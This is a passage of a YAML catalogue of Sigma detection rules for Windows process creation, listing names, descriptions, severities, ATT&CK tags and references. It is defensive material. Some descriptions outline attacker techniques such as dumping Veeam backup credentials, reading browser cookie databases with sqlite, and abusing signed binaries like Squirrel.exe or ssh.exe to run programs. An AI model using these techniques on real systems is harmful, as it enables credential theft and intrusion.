  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://web.archive.org/web/20200329173843/https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation
  - https://www.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation/?edition=2019
  false_positives:
  - Administration activity
  notes: ''
- detection_id: 99c8be4f-3087-4f9f-9c24-8c7e257b442e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_setup16_custom_lst_execution.yml
  name: Setup16.EXE Execution With Custom .Lst File
  description: 'Detects the execution of "Setup16.EXE" and old installation utility
    with a custom ".lst" file.

    These ".lst" file can contain references to external program that "Setup16.EXE"
    will execute.

    Attackers and adversaries might leverage this as a living of the land utility.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.005
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2024/10/12/the-sweet16-the-oldbin-lolbin-called-setup16-exe/
  false_positives:
  - On modern Windows system, the "Setup16" utility is practically never used, hence
    false positive should be very rare.
  notes: ''
- detection_id: 34ebb878-1b15-4895-b352-ca2eeb99b274
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_shutdown_execution.yml
  name: Suspicious Execution of Shutdown
  description: Use of the commandline to shutdown or reboot windows
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1529
  tags:
  - attack.impact
  - attack.t1529
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1529/T1529.md
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown
  false_positives:
  - Unknown
  notes: ''
- detection_id: ec290c06-9b6b-4338-8b6b-095c0f284f10
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_shutdown_logoff.yml
  name: Suspicious Execution of Shutdown to Log Out
  description: Detects the rare use of the command line tool shutdown to logoff a
    user
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1529
  tags:
  - attack.impact
  - attack.t1529
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1529/T1529.md
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7d4aaec2-08ed-4430-8b96-28420e030e04
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sigverif_uncommon_child_process.yml
  name: Uncommon Sigverif.EXE Child Process
  description: 'Detects uncommon child processes spawning from "sigverif.exe", which
    could indicate potential abuse of the latter as a living of the land binary in
    order to proxy execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/
  - https://twitter.com/0gtweet/status/1457676633809330184
  false_positives:
  - Unknown
  notes: ''
- detection_id: ba42babc-0666-4393-a4f7-ceaf5a69191e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sndvol_susp_child_processes.yml
  name: Uncommon Child Processes Of SndVol.exe
  description: Detects potentially uncommon child processes of SndVol.exe (the Windows
    volume mixer)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/Max_Mal_/status/1661322732456353792
  false_positives:
  - Unknown
  notes: ''
- detection_id: 83865853-59aa-449e-9600-74b9d89a6d6e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_soundrecorder_audio_capture.yml
  name: Audio Capture via SoundRecorder
  description: Detect attacker collecting audio via SoundRecorder application.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1123
  tags:
  - attack.collection
  - attack.t1123
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md
  - https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html
  false_positives:
  - Legitimate audio capture by legitimate user.
  notes: ''
- detection_id: 78f10490-f2f4-4d19-a75b-4e0683bf3b8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_speechruntime_child_process.yml
  name: Suspicious Speech Runtime Binary Child Process
  description: 'Detects suspicious Speech Runtime Binary Execution by monitoring its
    child processes.

    Child processes spawned by SpeechRuntime.exe could indicate an attempt for lateral
    movement via COM & DCOM hijacking.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.003
  - T1218
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.t1021.003
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/rtecCyberSec/SpeechRuntimeMove
  false_positives:
  - Unlikely.
  notes: ''
- detection_id: 1f1a8509-2cbb-44f5-8751-8e1571518ce2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_splwow64_cli_anomaly.yml
  name: Suspicious Splwow64 Without Params
  description: Detects suspicious Splwow64.exe process without any command line parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1429401053229891590?s=12
  false_positives:
  - Unknown
  notes: ''
- detection_id: dcdbc940-0bff-46b2-95f3-2d73f848e33b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_spoolsv_susp_child_processes.yml
  name: Suspicious Spool Service Child Process
  description: Detects suspicious print spool service (spoolsv.exe) child processes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1068
  - T1203
  tags:
  - attack.execution
  - attack.t1203
  - attack.privilege-escalation
  - attack.t1068
  time_window: ''
  references:
  - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/efa17a600b43c897b4b7463cc8541daa1987eeb4/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 696bfb54-227e-4602-ac5b-30d9d2053312
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sqlcmd_veeam_db_recon.yml
  name: Veeam Backup Database Suspicious Query
  description: Detects potentially suspicious SQL queries using SQLCmd targeting the
    Veeam backup databases in order to steal information.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  tags:
  - attack.collection
  - attack.t1005
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Unknown
  notes: ''
- detection_id: b57ba453-b384-4ab9-9f40-1038086b4e53
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sqlcmd_veeam_dump.yml
  name: VeeamBackup Database Credentials Dump Via Sqlcmd.EXE
  description: Detects dump of credentials in VeeamBackup dbo
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  tags:
  - attack.collection
  - attack.t1005
  time_window: ''
  references:
  - https://thedfirreport.com/2021/12/13/diavol-ransomware/
  - https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 24c77512-782b-448a-8950-eddb0785fc71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sqlite_chromium_profile_data.yml
  name: SQLite Chromium Profile Data DB Access
  description: Detect usage of the "sqlite" binary to query databases in Chromium-based
    browsers for potential data stealing.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  - T1539
  - T1555.003
  tags:
  - attack.credential-access
  - attack.t1539
  - attack.t1555.003
  - attack.collection
  - attack.t1005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/84d9edaaaa2c5511144521b0e4af726d1c7276ce/atomics/T1539/T1539.md#atomic-test-2---steal-chrome-cookies-windows
  - https://blog.cyble.com/2022/04/21/prynt-stealer-a-new-info-stealer-performing-clipper-and-keylogger-activities/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4833155a-4053-4c9c-a997-777fcea0baa7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sqlite_firefox_gecko_profile_data.yml
  name: SQLite Firefox Profile Data DB Access
  description: Detect usage of the "sqlite" binary to query databases in Firefox and
    other Gecko-based browsers for potential data stealing.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  - T1539
  tags:
  - attack.credential-access
  - attack.t1539
  - attack.collection
  - attack.t1005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1539/T1539.md#atomic-test-1---steal-firefox-cookies-windows
  - https://blog.cyble.com/2022/04/21/prynt-stealer-a-new-info-stealer-performing-clipper-and-keylogger-activities/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_squirrel_download.yml
  name: Arbitrary File Download Via Squirrel.EXE
  description: 'Detects the usage of the "Squirrel.exe" to download arbitrary files.
    This binary is part of multiple Electron based software installations (Slack,
    Teams, Discord, etc.)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/
  - http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/
  - http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
  false_positives:
  - Expected FP with some Electron based applications such as (1Clipboard, Beaker
    Browser, Caret, Discord, GitHub Desktop, etc.)
  notes: ''
- detection_id: 45239e6a-b035-4aaf-b339-8ad379fcb67e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_squirrel_proxy_execution.yml
  name: Process Proxy Execution Via Squirrel.EXE
  description: 'Detects the usage of the "Squirrel.exe" binary to execute arbitrary
    processes. This binary is part of multiple Electron based software installations
    (Slack, Teams, Discord, etc.)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/
  - http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/
  - http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
  false_positives:
  - Expected FP with some Electron based applications such as (1Clipboard, Beaker
    Browser, Caret, Discord, GitHub Desktop, etc.)
  notes: ''
- detection_id: 327f48c1-a6db-4eb8-875a-f6981f1b0183
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ssh_port_forward.yml
  name: Port Forwarding Activity Via SSH.EXE
  description: Detects port forwarding activity via SSH.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  - T1021.004
  - T1572
  tags:
  - attack.command-and-control
  - attack.lateral-movement
  - attack.t1572
  - attack.t1021.001
  - attack.t1021.004
  time_window: ''
  references:
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Administrative activity using a remote port forwarding to a local port
  notes: ''
- detection_id: 7d6d30b8-5b91-4b90-a891-46cccaf29598
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ssh_proxy_execution.yml
  name: Program Executed Using Proxy/Local Command Via SSH.EXE
  description: Detect usage of the "ssh.exe" binary as a proxy to launch other programs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ssh/
  - https://github.com/LOLBAS-Project/LOLBAS/pull/211/files
  - https://gtfobins.github.io/gtfobins/ssh/
  - https://man.openbsd.org/ssh_config#ProxyCommand
  - https://man.openbsd.org/ssh_config#LocalCommand
  false_positives:
  - Legitimate usage for administration purposes
  notes: ''
- detection_id: f7d7ebd5-a016-46e2-9c54-f9932f2d386d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ssh_rdp_tunneling.yml
  name: Potential RDP Tunneling Via SSH
  description: Execution of ssh.exe to perform data exfiltration and tunneling through
    RDP
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  time_window: ''
  references:
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d20ee2f4-822c-4827-9e15-41500b1fff10
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ssm_agent_abuse.yml
  name: Potential Amazon SSM Agent Hijacking
  description: Detects potential Amazon SSM agent hijack attempts as outlined in the
    Mitiga research report.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.persistence
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan
  - https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/
  - https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/
  false_positives:
  - Legitimate activity of system administrators
  notes: ''
- detection_id: 961e0abb-1b1e-4c84-a453-aafe56ad0d34
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_stordiag_susp_child_process.yml
  name: Execution via stordiag.exe
  description: Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe
    and fltmc.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://strontic.github.io/xcyclopedia/library/stordiag.exe-1F08FC87C373673944F6A7E8B18CD845.html
  - https://twitter.com/eral4m/status/1451112385041911809
  false_positives:
  - Legitimate usage of stordiag.exe.
  notes: ''
- detection_id: 16905e21-66ee-42fe-b256-1318ada2d770
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_16bit_application.yml
  name: Start of NT Virtual DOS Machine
  description: Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit
    Windows operating systems, as well as the execution of both 16-bit and 32-bit
    DOS applications
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/compatibility/ntvdm-and-16-bit-app-support
  - https://support.microsoft.com/fr-fr/topic/an-ms-dos-based-program-that-uses-the-ms-dos-protected-mode-interface-crashes-on-a-computer-that-is-running-windows-7-5dc739ea-987b-b458-15e4-d28d5cca63c7
  - https://app.any.run/tasks/93fe92fa-8b2b-4d92-8c09-a841aed2e793/
  - https://app.any.run/tasks/214094a7-0abc-4a7b-a564-1b757faed79d/
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: d522eca2-2973-4391-a3e0-ef0374321dae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_abusing_debug_privilege.yml
  name: Abused Debug Privilege by Arbitrary Parent Processes
  description: Detection of unusual child processes by different system processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-74-638.jpg
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad720b90-25ad-43ff-9b5e-5c841facc8e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_add_user_local_admin_group.yml
  name: User Added to Local Administrators Group
  description: Detects addition of users to the local administrator group via "Net"
    or "Add-LocalGroupMember".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 10fb649c-3600-4d37-b1e6-56ea90bb7e09
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_add_user_privileged_group.yml
  name: User Added To Highly Privileged Group
  description: Detects addition of users to highly privileged groups via "Net" or
    "Add-LocalGroupMember".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  false_positives:
  - Administrative activity that must be investigated
  notes: ''
- detection_id: ffa28e60-bdb1-46e0-9f82-05f7a61cc06e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_add_user_remote_desktop_group.yml
  name: User Added to Remote Desktop Users Group
  description: Detects addition of users to the local Remote Desktop Users group via
    "Net" or "Add-LocalGroupMember".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1021.001
  - T1133
  - T1136.001
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.lateral-movement
  - attack.t1133
  - attack.t1136.001
  - attack.t1021.001
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 7f43c430-5001-4f8b-aaa9-c3b88f18fa5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
  name: Execute From Alternate Data Streams
  description: Detects execution from an Alternate Data Stream (ADS). Adversaries
    may use NTFS file attributes to hide their malicious data in order to evade detection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.004/T1564.004.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd951fdc-4b2f-47f5-ba99-a33bf61e3770
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_always_install_elevated_windows_installer.yml
  name: Always Install Elevated Windows Installer
  description: Detects Windows Installer service (msiexec.exe) trying to install MSI
    packages with SYSTEM privilege
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-48-638.jpg
  false_positives:
  - System administrator usage
  - Anti virus products
  - WindowsApps located in "C:\Program Files\WindowsApps\"
  notes: ''
- detection_id: f91ed517-a6ba-471d-9910-b3b4a398c0f3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_appx_execution.yml
  name: Potentially Suspicious Windows App Activity
  description: Detects potentially suspicious child process of applications launched
    from inside the WindowsApps directory. This could be a sign of a rogue ".appx"
    package installation/execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  false_positives:
  - Legitimate packages that make use of external binaries such as Windows Terminal
  notes: ''
- detection_id: 24de4f3b-804c-4165-b442-5a06a2302c7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_arbitrary_shell_execution_via_settingcontent.yml
  name: Arbitrary Shell Command Execution Via Settingcontent-Ms
  description: The .SettingContent-ms file type was introduced in Windows 10 and allows
    a user to create "shortcuts" to various Windows 10 setting pages. These files
    are simply XML and contain paths to various Windows 10 settings binaries.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204
  - T1566.001
  tags:
  - attack.t1204
  - attack.t1566.001
  - attack.execution
  - attack.initial-access
  time_window: ''
  references:
  - https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
  false_positives:
  - Unknown
  notes: ''
- detection_id: fcdf69e5-a3d3-452a-9724-26f2308bf2b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_archiver_iso_phishing.yml
  name: Phishing Pattern ISO in Archive
  description: Detects cases in which an ISO files is opend within an archiver like
    7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files
    in archives as email attachments to bypass certain filters and protective measures
    (mark of web)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1566
  tags:
  - attack.initial-access
  - attack.t1566
  time_window: ''
  references:
  - https://twitter.com/1ZRR4H/status/1534259727059787783
  - https://app.any.run/tasks/e1fe6a62-bce8-4323-a49a-63795d9afd5d/
  false_positives:
  - Legitimate cases in which archives contain ISO or IMG files and the user opens
    the archive and the image via clicking and not extraction
  notes: ''
- detection_id: f576a613-2392-4067-9d1a-9345fb58d8d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_automated_collection.yml
  name: Automated Collection Command Prompt
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1119
  - T1552.001
  tags:
  - attack.collection
  - attack.t1119
  - attack.credential-access
  - attack.t1552.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: a7c3d773-caef-227e-a7e7-c2f13c622329
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_bad_opsec_sacrificial_processes.yml
  name: Bad Opsec Defaults Sacrificial Processes With Improper Arguments
  description: 'Detects attackers using tooling with bad opsec defaults.

    E.g. spawning a sacrificial process to inject a capability into the process without
    taking into account how the process is normally run.

